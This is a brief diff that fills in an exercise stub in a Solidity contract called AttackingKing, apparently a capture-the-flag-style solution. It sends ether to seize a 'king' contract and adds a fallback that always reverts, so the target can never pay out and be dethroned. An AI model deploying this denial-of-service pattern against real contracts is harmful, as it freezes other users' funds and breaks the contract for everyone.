@@ -11,6 +11,10 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        payable(contractAddress).call{value: 1000000000000000001}("");
+    }
+
+    fallback() external payable {
+        revert("no thank you");
     }
 }
